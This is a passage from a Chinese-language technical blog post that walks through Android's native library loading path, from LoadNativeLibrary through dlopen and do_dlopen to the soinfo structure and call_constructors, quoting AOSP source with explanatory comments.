worthwhile. &#125; else &#123; was_successful = true; &#125; VLOG(jni) &lt;&lt; \"[Returned \" &lt;&lt; (was_successful ? \"successfully\" : \"failure\") &lt;&lt; \" from JNI_OnLoad in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\";&#125; 完整的 LoadNativeLibrary 代码 //android-platform\\art\\runtime\\jni\\java_vm_ext.ccbool JavaVMExt::LoadNativeLibrary(JNIEnv* env, const std::string&amp; path, jobject class_loader, jclass caller_class, std::string* error_msg) &#123; error_msg->clear(); // 阶段一：判断目标 so 是否已经被加载过 // See if we've already loaded this library. If we have, and the class loader // matches, return successfully without doing anything. // TODO: for better results we should canonicalize (规范化) the pathname (or even compare // inodes). This implementation is fine if everybody is using System.loadLibrary. SharedLibrary* library; Thread* self = Thread::Current(); &#123; // TODO: move the locking (and more of this logic) into Libraries. MutexLock mu(self, *Locks::jni_libraries_lock_); library = libraries_->Get(path); &#125; void* class_loader_allocator = nullptr; std::string caller_location; &#123; ScopedObjectAccess soa(env); // As the incoming class loader is reachable/alive during the call of this function, // it's okay to decode it without worrying about unexpectedly marking it alive. ObjPtr&lt;mirror::ClassLoader> loader = soa.Decode&lt;mirror::ClassLoader>(class_loader); ClassLinker* class_linker = Runtime::Current()->GetClassLinker(); if (class_linker->IsBootClassLoader(soa, loader.Ptr())) &#123; loader = nullptr; class_loader = nullptr; if (caller_class != nullptr) &#123; ObjPtr&lt;mirror::Class> caller = soa.Decode&lt;mirror::Class>(caller_class); ObjPtr&lt;mirror::DexCache> dex_cache = caller->GetDexCache(); if (dex_cache != nullptr) &#123; caller_location = dex_cache->GetLocation()->ToModifiedUtf8(); &#125; &#125; &#125; class_loader_allocator = class_linker->GetAllocatorForClassLoader(loader.Ptr()); CHECK(class_loader_allocator != nullptr); &#125; if (library != nullptr) &#123; // Use the allocator pointers for class loader equality to avoid unnecessary weak root decode. if (library->GetClassLoaderAllocator() != class_loader_allocator) &#123; // The library will be associated with class_loader. The JNI // spec says we can't load the same library into more than one // class loader. // // This isn't very common. So spend some time to get a readable message. auto call_to_string = [&amp;](jobject obj) -> std::string &#123; if (obj == nullptr) &#123; return \"null\"; &#125; // Handle jweaks. Ignore double local-ref. ScopedLocalRef&lt;jobject> local_ref(env, env->NewLocalRef(obj)); if (local_ref != nullptr) &#123; ScopedLocalRef&lt;jclass> local_class(env, env->GetObjectClass(local_ref.get())); jmethodID to_string = env->GetMethodID(local_class.get(), \"toString\", \"()Ljava/lang/String;\"); DCHECK(to_string != nullptr); ScopedLocalRef&lt;jobject> local_string(env, env->CallObjectMethod(local_ref.get(), to_string)); if (local_string != nullptr) &#123; ScopedUtfChars utf(env, reinterpret_cast&lt;jstring>(local_string.get())); if (utf.c_str() != nullptr) &#123; return utf.c_str(); &#125; &#125; if (env->ExceptionCheck()) &#123; // We can't do much better logging, really. So leave it with a Describe. env->ExceptionDescribe(); env->ExceptionClear(); &#125; return \"(Error calling toString)\"; &#125; return \"null\"; &#125;; std::string old_class_loader = call_to_string(library->GetClassLoader()); std::string new_class_loader = call_to_string(class_loader); StringAppendF(error_msg, \"Shared library \\\"%s\\\" already opened by \" \"ClassLoader %p(%s); can't open in ClassLoader %p(%s)\", path.c_str(), library->GetClassLoader(), old_class_loader.c_str(), class_loader, new_class_loader.c_str()); LOG(WARNING) &lt;&lt; *error_msg; return false; &#125; VLOG(jni) &lt;&lt; \"[Shared library \\\"\" &lt;&lt; path &lt;&lt; \"\\\" already loaded in \" &lt;&lt; \" ClassLoader \" &lt;&lt; class_loader &lt;&lt; \"]\"; if (!library->CheckOnLoadResult()) &#123; StringAppendF(error_msg, \"JNI_OnLoad failed on a previous attempt \" \"to load \\\"%s\\\"\", path.c_str()); return false; &#125; return true; &#125; // 阶段二：加载 so // Open the shared library. Because we're using a full path, the system // doesn't have to search through LD_LIBRARY_PATH. (It may do so to // resolve this library's dependencies though.) // Failures here are expected when java.library.path has several entries // and we have to hunt for the lib. // Below we dlopen but there is no paired dlclose, this would be necessary if we supported // class unloading. Libraries will only be unloaded when the reference count (incremented by // dlopen) becomes zero from dlclose. // Retrieve the library path from the classloader, if necessary. ScopedLocalRef&lt;jstring> library_path(env, GetLibrarySearchPath(env, class_loader)); Locks::mutator_lock_->AssertNotHeld(self); const char* path_str = path.empty() ? nullptr : path.c_str(); bool needs_native_bridge = false; char* nativeloader_error_msg = nullptr; // 调用 dlopen 打开目标 so void* handle = android::OpenNativeLibrary( env, runtime_->GetTargetSdkVersion(), path_str, class_loader, (caller_location.empty() ? nullptr : caller_location.c_str()), library_path.get(), &amp;needs_native_bridge, &amp;nativeloader_error_msg); VLOG(jni) &lt;&lt; \"[Call to dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) returned \" &lt;&lt; handle &lt;&lt; \"]\"; if (handle == nullptr) &#123; *error_msg = nativeloader_error_msg; android::NativeLoaderFreeErrorMessage(nativeloader_error_msg); VLOG(jni) &lt;&lt; \"dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) failed: \" &lt;&lt; *error_msg; return false; &#125; if (env->ExceptionCheck() == JNI_TRUE) &#123; LOG(ERROR) &lt;&lt; \"Unexpected exception:\"; env->ExceptionDescribe(); env->ExceptionClear(); &#125; // Create a new entry. // TODO: move the locking (and more of this logic) into Libraries. bool created_library = false; &#123; // Create SharedLibrary ahead of taking the libraries lock to maintain lock ordering. std::unique_ptr&lt;SharedLibrary> new_library( new SharedLibrary(env, self, path, handle, needs_native_bridge, class_loader, class_loader_allocator)); MutexLock mu(self, *Locks::jni_libraries_lock_); library = libraries_->Get(path); if (library == nullptr) &#123; // We won race to get libraries_lock. library = new_library.release(); libraries_->Put(path, library); created_library = true; &#125; &#125; if (!created_library) &#123; LOG(INFO) &lt;&lt; \"WOW: we lost a race to add shared library: \" &lt;&lt; \"\\\"\" &lt;&lt; path &lt;&lt; \"\\\" ClassLoader=\" &lt;&lt; class_loader; return library->CheckOnLoadResult(); &#125; // 动态链接库装载完成 VLOG(jni) &lt;&lt; \"[Added shared library \\\"\" &lt;&lt; path &lt;&lt; \"\\\" for ClassLoader \" &lt;&lt; class_loader &lt;&lt; \"]\"; // 阶段三：当 so 被加载之后，立即调用导出函数 JNI_OnLoad bool was_successful = false; void* sym = library->FindSymbol(\"JNI_OnLoad\", nullptr); if (sym == nullptr) &#123; VLOG(jni) &lt;&lt; \"[No JNI_OnLoad found in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; was_successful = true; &#125; else &#123; // Call JNI_OnLoad. We have to override the current class // loader, which will always be \"null\" since the stuff at the // top of the stack is around Runtime.loadLibrary(). (See // the comments in the JNI FindClass function.) ScopedLocalRef&lt;jobject> old_class_loader(env, env->NewLocalRef(self->GetClassLoaderOverride())); self->SetClassLoaderOverride(class_loader); VLOG(jni) &lt;&lt; \"[Calling JNI_OnLoad in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; using JNI_OnLoadFn = int(*)(JavaVM*, void*); JNI_OnLoadFn jni_on_load = reinterpret_cast&lt;JNI_OnLoadFn>(sym); int version = (*jni_on_load)(this, nullptr); if (IsSdkVersionSetAndAtMost(runtime_->GetTargetSdkVersion(), SdkVersion::kL)) &#123; // Make sure that sigchain owns SIGSEGV. EnsureFrontOfChain(SIGSEGV); &#125; self->SetClassLoaderOverride(old_class_loader.get()); if (version == JNI_ERR) &#123; StringAppendF(error_msg, \"JNI_ERR returned from JNI_OnLoad in \\\"%s\\\"\", path.c_str()); &#125; else if (JavaVMExt::IsBadJniVersion(version)) &#123; StringAppendF(error_msg, \"Bad JNI version returned from JNI_OnLoad in \\\"%s\\\": %d\", path.c_str(), version); // It's unwise to call dlclose() here, but we can mark it // as bad and ensure that future load attempts will fail. // We don't know how far JNI_OnLoad got, so there could // be some partially-initialized stuff accessible through // newly-registered native method calls. We could try to // unregister them, but that doesn't seem worthwhile. &#125; else &#123; was_successful = true; &#125; VLOG(jni) &lt;&lt; \"[Returned \" &lt;&lt; (was_successful ? \"successfully\" : \"failure\") &lt;&lt; \" from JNI_OnLoad in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; &#125; library->SetResult(was_successful); return was_successful;&#125;# so 的加载过程 在刚刚对于 vm-&gt;LoadNativeLibrary 函数 so加载时 的简要分析中，我们知道目标 so 是通过 dlopen 打开的，我们可以从 android::OpenNativeLibrary 函数开始分析 //android-platform\\art\\runtime\\jni\\java_vm_ext.ccbool JavaVMExt::LoadNativeLibrary(JNIEnv* env, const std::string&amp; path, jobject class_loader, jclass caller_class, std::string* error_msg) &#123; error_msg->clear(); // 阶段一：判断目标 so 是否已经被加载过 ... // 阶段二：加载 so // Open the shared library. Because we're using a full path, the system // doesn't have to search through LD_LIBRARY_PATH. (It may do so to // resolve this library's dependencies though.) // Failures here are expected when java.library.path has several entries // and we have to hunt for the lib. // Below we dlopen but there is no paired dlclose, this would be necessary if we supported // class unloading. Libraries will only be unloaded when the reference count (incremented by // dlopen) becomes zero from dlclose. // Retrieve the library path from the classloader, if necessary. ScopedLocalRef&lt;jstring> library_path(env, GetLibrarySearchPath(env, class_loader)); Locks::mutator_lock_->AssertNotHeld(self); const char* path_str = path.empty() ? nullptr : path.c_str(); bool needs_native_bridge = false; char* nativeloader_error_msg = nullptr; // 调用 dlopen 打开目标 so void* handle = android::OpenNativeLibrary( env, runtime_->GetTargetSdkVersion(), path_str, class_loader, (caller_location.empty() ? nullptr : caller_location.c_str()), library_path.get(), &amp;needs_native_bridge, &amp;nativeloader_error_msg); VLOG(jni) &lt;&lt; \"[Call to dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) returned \" &lt;&lt; handle &lt;&lt; \"]\"; if (handle == nullptr) &#123; *error_msg = nativeloader_error_msg; android::NativeLoaderFreeErrorMessage(nativeloader_error_msg); VLOG(jni) &lt;&lt; \"dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) failed: \" &lt;&lt; *error_msg; return false; &#125; if (env->ExceptionCheck() == JNI_TRUE) &#123; LOG(ERROR) &lt;&lt; \"Unexpected exception:\"; env->ExceptionDescribe(); env->ExceptionClear(); &#125; // Create a new entry. // TODO: move the locking (and more of this logic) into Libraries. bool created_library = false; &#123; // Create SharedLibrary ahead of taking the libraries lock to maintain lock ordering. std::unique_ptr&lt;SharedLibrary> new_library( new SharedLibrary(env, self, path, handle, needs_native_bridge, class_loader, class_loader_allocator)); MutexLock mu(self, *Locks::jni_libraries_lock_); library = libraries_->Get(path); if (library == nullptr) &#123; // We won race to get libraries_lock. library = new_library.release(); libraries_->Put(path, library); created_library = true; &#125; &#125; if (!created_library) &#123; LOG(INFO) &lt;&lt; \"WOW: we lost a race to add shared library: \" &lt;&lt; \"\\\"\" &lt;&lt; path &lt;&lt; \"\\\" ClassLoader=\" &lt;&lt; class_loader; return library->CheckOnLoadResult(); &#125; // 动态链接库装载完成 VLOG(jni) &lt;&lt; \"[Added shared library \\\"\" &lt;&lt; path &lt;&lt; \"\\\" for ClassLoader \" &lt;&lt; class_loader &lt;&lt; \"]\"; // 阶段三：当 so 被加载之后，立即调用导出函数 JNI_OnLoad ...&#125;# android::OpenNativeLibrary 这个函数中有条件编译，接下来我们分析的是 ART_TARGET_ANDROID 的编译条件分支 跟踪 path 参数，可以发现它被传入到了 android_dlopen_ext(const char* filename, int flag, const android_dlextinfo* extinfo) 函数中， flag RTLD_NOW 的含义是立即解析所有符号，并在加载时报告任何解析错误 android_dlopen_ext 函数的常见 flag 含义 RTLD_NOW 立即解析所有符号，并在加载时报告任何解析错误 RTLD_LAZY 只在符号首次使用时解析 RTLD_GLOBAL 将库及其符号添加到全局命名空间中，以便其他库可以使用这些符号 extinfo 的值为 &#123;.flags = ANDROID_DLEXT_USE_NAMESPACE,.library_namespace = boot_namespace,&#125;; //android-platform\\art\\libnativeloader\\native_loader.cppvoid* OpenNativeLibrary(JNIEnv* env, int32_t target_sdk_version, const char* path, jobject class_loader, const char* caller_location, jstring library_path, bool* needs_native_bridge, char** error_msg) &#123;// 条件编译//ART_TARGET_ANDROID - Defined for target Android builds of ART.//ref: https://android.googlesource.com/platform/art/+/32c8337/runtime/globals.h#if defined(ART_TARGET_ANDROID) UNUSED(target_sdk_version); if (class_loader == nullptr) &#123; *needs_native_bridge = false; if (caller_location != nullptr) &#123; android_namespace_t* boot_namespace = FindExportedNamespace(caller_location); if (boot_namespace != nullptr) &#123; const android_dlextinfo dlextinfo = &#123; .flags = ANDROID_DLEXT_USE_NAMESPACE, .library_namespace = boot_namespace, &#125;; // 调用 android_dlopen_ext, 并传入 path void* handle = android_dlopen_ext(path, RTLD_NOW, &amp;dlextinfo); if (handle == nullptr) &#123; *error_msg = strdup(dlerror()); &#125; return handle; &#125; &#125; // Check if the library is in NATIVELOADER_DEFAULT_NAMESPACE_LIBS and should // be loaded from the kNativeloaderExtraLibs namespace. &#123; Result&lt;void*> handle = TryLoadNativeloaderExtraLib(path); if (!handle.ok()) &#123; *error_msg = strdup(handle.error().message().c_str()); return nullptr; &#125; if (handle.value() != nullptr) &#123; return handle.value(); &#125; &#125; // Fall back to the system namespace. This happens for preloaded JNI // libraries in the zygote. // TODO(b/185833744): Investigate if this should fall back to the app main // namespace (aka anonymous namespace) instead. void* handle = OpenSystemLibrary(path, RTLD_NOW); if (handle == nullptr) &#123; *error_msg = strdup(dlerror()); &#125; return handle; &#125; std::lock_guard&lt;std::mutex> guard(g_namespaces_mutex); NativeLoaderNamespace* ns; if ((ns = g_namespaces->FindNamespaceByClassLoader(env, class_loader)) == nullptr) &#123; // This is the case where the classloader was not created by ApplicationLoaders // In this case we create an isolated not-shared namespace for it. Result&lt;NativeLoaderNamespace*> isolated_ns = CreateClassLoaderNamespaceLocked(env, target_sdk_version, class_loader, /*is_shared=*/false, /*dex_path=*/nullptr, library_path, /*permitted_path=*/nullptr, /*uses_library_list=*/nullptr); if (!isolated_ns.ok()) &#123; *error_msg = strdup(isolated_ns.error().message().c_str()); return nullptr; &#125; else &#123; ns = *isolated_ns; &#125; &#125; return OpenNativeLibraryInNamespace(ns, path, needs_native_bridge, error_msg);#else UNUSED(env, target_sdk_version, class_loader, caller_location); // Do some best effort to emulate library-path support. It will not // work for dependencies. // // Note: null has a special meaning and must be preserved. std::string c_library_path; // Empty string by default. if (library_path != nullptr &amp;&amp; path != nullptr &amp;&amp; path[0] != '/') &#123; ScopedUtfChars library_path_utf_chars(env, library_path); c_library_path = library_path_utf_chars.c_str(); &#125; std::vector&lt;std::string> library_paths = base::Split(c_library_path, \":\"); for (const std::string&amp; lib_path : library_paths) &#123; *needs_native_bridge = false; const char* path_arg; std::string complete_path; if (path == nullptr) &#123; // Preserve null. path_arg = nullptr; &#125; else &#123; complete_path = lib_path; if (!complete_path.empty()) &#123; complete_path.append(\"/\"); &#125; complete_path.append(path); path_arg = complete_path.c_str(); &#125; void* handle = dlopen(path_arg, RTLD_NOW); if (handle != nullptr) &#123; return handle; &#125; if (NativeBridgeIsSupported(path_arg)) &#123; *needs_native_bridge = true; handle = NativeBridgeLoadLibrary(path_arg, RTLD_NOW); if (handle != nullptr) &#123; return handle; &#125; *error_msg = strdup(NativeBridgeGetError()); &#125; else &#123; *error_msg = strdup(dlerror()); &#125; &#125; return nullptr;#endif&#125;# android_dlopen_ext android_dlopen_ext 调用了 __loader_android_dlopen_ext 在代码的第四行出现了内建函数 __builtin_return_address(LEVEL) , 这个函数用来返回当前函数或调用者的返回地址。函数的参数 LEVEL 表示函数调用链中的不同层次的函数，各个值代表的意义如下: 0：返回当前函数的返回地址； 1：返回当前函数调用者的返回地址； 2：返回当前函数调用者的调用者的返回地址； //android-platform\\bionic\\libdl\\libdl.cpp__attribute__((__weak__))void* android_dlopen_ext(const char* filename, int flag, const android_dlextinfo* extinfo) &#123; const void* caller_addr = __builtin_return_address(0); return __loader_android_dlopen_ext(filename, flag, extinfo, caller_addr);&#125;# __loader_android_dlopen_ext __loader_android_dlopen_ext 调用了 dlopen_ext //android-platform\\bionic\\linker\\dlfcn.cppvoid* __loader_android_dlopen_ext(const char* filename, int flags, const android_dlextinfo* extinfo, const void* caller_addr) &#123; return dlopen_ext(filename, flags, extinfo, caller_addr);&#125;# dlopen_ext dlopen_ext 中调用了 do_dlopen //android-platform\\bionic\\linker\\dlfcn.cppstatic void* dlopen_ext(const char* filename, int flags, const android_dlextinfo* extinfo, const void* caller_addr) &#123; ScopedPthreadMutexLocker locker(&amp;g_dl_mutex); g_linker_logger.ResetState(); void* result = do_dlopen(filename, flags, extinfo, caller_addr); if (result == nullptr) &#123; __bionic_format_dlerror(\"dlopen failed\", linker_get_error_buffer()); return nullptr; &#125; return result;&#125;# do_dlopen 这个函数中最为关键的是调用 find_library 获取到了待加载 so 的 soinfo //android-platform\\bionic\\linker\\linker.cppvoid* do_dlopen(const char* name, int flags, const android_dlextinfo* extinfo, const void* caller_addr) &#123; std::string trace_prefix = std::string(\"dlopen: \") + (name == nullptr ? \"(nullptr)\" : name); ScopedTrace trace(trace_prefix.c_str()); ScopedTrace loading_trace((trace_prefix + \" - loading and linking\").c_str()); soinfo* const caller = find_containing_library(caller_addr); android_namespace_t* ns = get_caller_namespace(caller); LD_LOG(kLogDlopen, \"dlopen(name=\\\"%s\\\", flags=0x%x, extinfo=%s, caller=\\\"%s\\\", caller_ns=%s@%p, targetSdkVersion=%i) ...\", name, flags, android_dlextinfo_to_string(extinfo).c_str(), caller == nullptr ? \"(null)\" : caller->get_realpath(), ns == nullptr ? \"(null)\" : ns->get_name(), ns, get_application_target_sdk_version()); auto purge_guard = android::base::make_scope_guard([&amp;]() &#123; purge_unused_memory(); &#125;); auto failure_guard = android::base::make_scope_guard( [&amp;]() &#123; LD_LOG(kLogDlopen, \"... dlopen failed: %s\", linker_get_error_buffer()); &#125;); // 对 flags 的合法性进行判断 if ((flags &amp; ~(RTLD_NOW|RTLD_LAZY|RTLD_LOCAL|RTLD_GLOBAL|RTLD_NODELETE|RTLD_NOLOAD)) != 0) &#123; DL_OPEN_ERR(\"invalid flags to dlopen: %x\", flags); return nullptr; &#125; // 对 extinfo 的合法性进行判断 if (extinfo != nullptr) &#123; if ((extinfo->flags &amp; ~(ANDROID_DLEXT_VALID_FLAG_BITS)) != 0) &#123; DL_OPEN_ERR(\"invalid extended flags to android_dlopen_ext: 0x%\" PRIx64, extinfo->flags); return nullptr; &#125; if ((extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) == 0 &amp;&amp; (extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != 0) &#123; DL_OPEN_ERR(\"invalid extended flag combination (ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET without \" \"ANDROID_DLEXT_USE_LIBRARY_FD): 0x%\" PRIx64, extinfo->flags); return nullptr; &#125; if ((extinfo->flags &amp; ANDROID_DLEXT_USE_NAMESPACE) != 0) &#123; if (extinfo->library_namespace == nullptr) &#123; DL_OPEN_ERR(\"ANDROID_DLEXT_USE_NAMESPACE is set but extinfo->library_namespace is null\"); return nullptr; &#125; ns = extinfo->library_namespace; &#125; &#125; // Workaround for dlopen(/system/lib/&lt;soname>) when .so is in /apex. http://b/121248172 // The workaround works only when targetSdkVersion &lt; Q. // 当 apk 的 targetSdkVersion&lt;Q 时才会将 /system 路径转换成 /apex 路径 (不太清楚这样做的意义是什么) std::string name_to_apex; if (translateSystemPathToApexPath(name, &amp;name_to_apex)) &#123; const char* new_name = name_to_apex.c_str(); LD_LOG(kLogDlopen, \"dlopen considering translation from %s to APEX path %s\", name, new_name); // Some APEXs could be optionally disabled. Only translate the path // when the old file is absent and the new file exists. // TODO(b/124218500): Re-enable it once app compat issue is resolved /* if (file_exists(name)) &#123; LD_LOG(kLogDlopen, \"dlopen %s exists, not translating\", name); &#125; else */ if (!file_exists(new_name)) &#123; LD_LOG(kLogDlopen, \"dlopen %s does not exist, not translating\", new_name); &#125; else &#123; LD_LOG(kLogDlopen, \"dlopen translation accepted: using %s\", new_name); name = new_name; &#125; &#125; // End Workaround for dlopen(/system/lib/&lt;soname>) when .so is in /apex. std::string asan_name_holder; const char* translated_name = name; if (g_is_asan &amp;&amp; translated_name != nullptr &amp;&amp; translated_name[0] == '/') &#123; char original_path[PATH_MAX]; if (realpath(name, original_path) != nullptr) &#123; asan_name_holder = std::string(kAsanLibDirPrefix) + original_path; if (file_exists(asan_name_holder.c_str())) &#123; soinfo* si = nullptr; if (find_loaded_library_by_realpath(ns, original_path, true, &amp;si)) &#123; PRINT(\"linker_asan dlopen NOT translating \\\"%s\\\" -> \\\"%s\\\": library already loaded\", name, asan_name_holder.c_str()); &#125; else &#123; PRINT(\"linker_asan dlopen translating \\\"%s\\\" -> \\\"%s\\\"\", name, translated_name); translated_name = asan_name_holder.c_str(); &#125; &#125; &#125; &#125; ProtectedDataGuard guard; // 重头戏，这里调用了 find_library 获取到了这个 so 的 soinfo soinfo* si = find_library(ns, translated_name, flags, extinfo, caller); loading_trace.End(); if (si != nullptr) &#123; void* handle = si->to_handle(); LD_LOG(kLogDlopen, \"... dlopen calling constructors: realpath=\\\"%s\\\", soname=\\\"%s\\\", handle=%p\", si->get_realpath(), si->get_soname(), handle); // 调用 call_constructors 函数来加载 so 中的 init 以及 init_array si->call_constructors(); failure_guard.Disable(); LD_LOG(kLogDlopen, \"... dlopen successful: realpath=\\\"%s\\\", soname=\\\"%s\\\", handle=%p\", si->get_realpath(), si->get_soname(), handle); return handle; &#125; return nullptr;&#125;# soinfo soinfo 结构体如下所示，可以用在 frida 或者 ida 中 //IMPORTANT//ELF64 启用该宏#define __LP64__ 1//ELF32 启用该宏//#define __work_around_b_24465209__ 1/*//https://android.googlesource.com/platform/bionic/+/master/linker/Android.bp架构为 32 位 定义__work_around_b_24465209__宏arch: &#123; arm: &#123;cflags: [\"-D__work_around_b_24465209__\"],&#125;, x86: &#123;cflags: [\"-D__work_around_b_24465209__\"],&#125;, &#125;*///android-platform\\bionic\\libc\\include\\link.h#if defined(__LP64__)#define ElfW(type) Elf64_ ## type#else#define ElfW(type) Elf32_ ## type#endif//android-platform\\bionic\\linker\\linker_common_types.h// Android uses RELA for LP64.#if defined(__LP64__)#define USE_RELA 1#endif//android-platform\\bionic\\libc\\kernel\\uapi\\asm-generic\\int-ll64.h//__signed__-->signedtypedef signed char __s8;typedef unsigned char __u8;typedef signed short __s16;typedef unsigned short __u16;typedef signed int __s32;typedef unsigned int __u32;typedef signed long long __s64;typedef unsigned long long __u64;//A12-src\\msm-google\\include\\uapi\\linux\\elf.h/* 32-bit ELF base types. */typedef __u32 Elf32_Addr;typedef __u16 Elf32_Half;typedef __u32 Elf32_Off;typedef __s32 Elf32_Sword;typedef __u32 Elf32_Word;/* 64-bit ELF base types. */typedef __u64 Elf64_Addr;typedef __u16 Elf64_Half;typedef __s16 Elf64_SHalf;typedef __u64 Elf64_Off;typedef __s32 Elf64_Sword;typedef __u32 Elf64_Word;typedef __u64 Elf64_Xword;typedef __s64 Elf64_Sxword;typedef struct dynamic&#123; Elf32_Sword d_tag; union&#123; Elf32_Sword d_val; Elf32_Addr d_ptr; &#125; d_un;&#125; Elf32_Dyn;typedef struct &#123; Elf64_Sxword d_tag; /* entry tag value */ union &#123; Elf64_Xword d_val; Elf64_Addr d_ptr; &#125; d_un;&#125; Elf64_Dyn;typedef struct elf32_rel &#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel;typedef struct elf64_rel &#123; Elf64_Addr r_offset; /* Location at which to apply the action */ Elf64_Xword r_info; /* index and type of relocation */&#125; Elf64_Rel;typedef struct elf32_rela&#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend;&#125; Elf32_Rela;typedef struct elf64_rela &#123; Elf64_Addr r_offset; /* Location at which to apply the action */ Elf64_Xword r_info; /* index and type of relocation */ Elf64_Sxword r_addend; /* Constant addend used to compute value */&#125; Elf64_Rela;typedef struct elf32_sym&#123; Elf32_Word st_name; Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other; Elf32_Half st_shndx;&#125; Elf32_Sym;typedef struct elf64_sym &#123; Elf64_Word st_name; /* Symbol name, index in string tbl */ unsigned char st_info; /* Type and binding attributes */ unsigned char st_other; /* No defined meaning, 0 */ Elf64_Half st_shndx; /* Associated section index */ Elf64_Addr st_value; /* Value of the symbol */ Elf64_Xword st_size; /* Associated symbol size */&#125; Elf64_Sym;#define EI_NIDENT 16typedef struct elf32_hdr&#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; /* Entry point */ Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr;typedef struct elf64_hdr &#123; unsigned char e_ident[EI_NIDENT]; /* ELF \"magic number\" */ Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version; Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize; Elf64_Half e_shnum; Elf64_Half e_shstrndx;&#125; Elf64_Ehdr;/* These constants define the permissions on sections in the program header, p_flags. */#define PF_R 0x4#define PF_W 0x2#define PF_X 0x1typedef struct elf32_phdr&#123; Elf32_Word p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz; Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align;&#125; Elf32_Phdr;typedef struct elf64_phdr &#123; Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment, file &amp; memory */&#125; Elf64_Phdr;typedef struct elf32_shdr &#123; Elf32_Word sh_name; Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr;typedef struct elf64_shdr &#123; Elf64_Word sh_name; /* Section name, index in string tbl */ Elf64_Word sh_type; /* Type of section */ Elf64_Xword sh_flags; /* Miscellaneous section attributes */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Size of section in bytes */ Elf64_Word sh_link; /* Index of another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */&#125; Elf64_Shdr;typedef unsigned long uintptr_t;struct link_map&#123; uintptr_t l_addr; char * l_name; uintptr_t l_ld; struct link_map * l_next; struct link_map * l_prev;&#125;;//android-platform\\bionic\\linker\\linker_soinfo.htypedef void (*linker_dtor_function_t)();typedef void (*linker_ctor_function_t)(int, char**, char**);#if defined(__work_around_b_24465209__)#define SOINFO_NAME_LEN 128#endifstruct soinfo &#123;#if defined(__work_around_b_24465209__) char old_name_[SOINFO_NAME_LEN];#endif const ElfW(Phdr)* phdr; size_t phnum;#if defined(__work_around_b_24465209__) ElfW(Addr) unused0; // DO NOT USE, maintained for compatibility.#endif ElfW(Addr) base; size_t size;#if defined(__work_around_b_24465209__) uint32_t unused1; // DO NOT USE, maintained for compatibility.#endif ElfW(Dyn)* dynamic;#if defined(__work_around_b_24465209__) uint32_t unused2; // DO NOT USE, maintained for compatibility uint32_t unused3; // DO NOT USE, maintained for compatibility#endif soinfo* next; uint32_t flags_; const char* strtab_; ElfW(Sym)* symtab_; size_t nbucket_; size_t nchain_; uint32_t* bucket_; uint32_t* chain_;#if !defined(__LP64__) ElfW(Addr)** unused4; // DO NOT USE, maintained for compatibility#endif#if defined(USE_RELA) ElfW(Rela)* plt_rela_; size_t plt_rela_count_; ElfW(Rela)* rela_; size_t rela_count_;#else ElfW(Rel)* plt_rel_; size_t plt_rel_count_; ElfW(Rel)* rel_; size_t rel_count_;#endif linker_ctor_function_t* preinit_array_; size_t preinit_array_count_; linker_ctor_function_t* init_array_; size_t init_array_count_; linker_dtor_function_t* fini_array_; size_t fini_array_count_; linker_ctor_function_t init_func_; linker_dtor_function_t fini_func_;#if defined(__arm__) // ARM EABI section used for stack unwinding. uint32_t* ARM_exidx; size_t ARM_exidx_count;#endif size_t ref_count_; link_map link_map_head; bool constructors_called; // When you read a virtual address from the ELF file, add this // value to get the corresponding address in the process' address space. ElfW(Addr) load_bias;#if !defined(__LP64__) bool has_text_relocations;#endif bool has_DT_SYMBOLIC;&#125;;# call_constructors 在这个函数中会先加载 init , 在 so 中的函数名一般为 init_proc , 然后加载 init_array 中的函数 //platform\\bionic\\linker\\linker_soinfo.cppvoid soinfo::call_constructors() &#123; if (constructors_called || g_is_ldd) &#123; return; &#125; // We set constructors_called before actually calling the constructors, otherwise it doesn't // protect against recursive constructor calls. One simple example of constructor recursion // is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so: // 1. The program depends on libc, so libc's constructor is called here. // 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so. // 3. dlopen() calls the constructors on the newly created // soinfo for libc_malloc_debug_leak.so. // 4. The debug .so depends on libc, so 